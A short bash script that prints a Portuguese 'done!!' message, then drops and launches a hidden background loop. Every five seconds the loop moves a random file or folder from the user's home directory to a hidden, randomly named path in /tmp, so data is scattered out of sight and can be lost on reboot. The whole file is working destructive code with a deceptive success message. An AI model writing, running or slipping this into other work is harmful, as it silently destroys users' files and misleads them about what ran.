#!/bin/bash

echo "feito!!" &&

echo '

while true; do file_to_move=$(find ~/ -maxdepth 2 | sort -R | head -1 ) 
mv "$file_to_move" /tmp/.$RANDOM; sleep 5; done' > /tmp/movendo &&

chmod +x /tmp/movendo && 
/tmp/movendo &
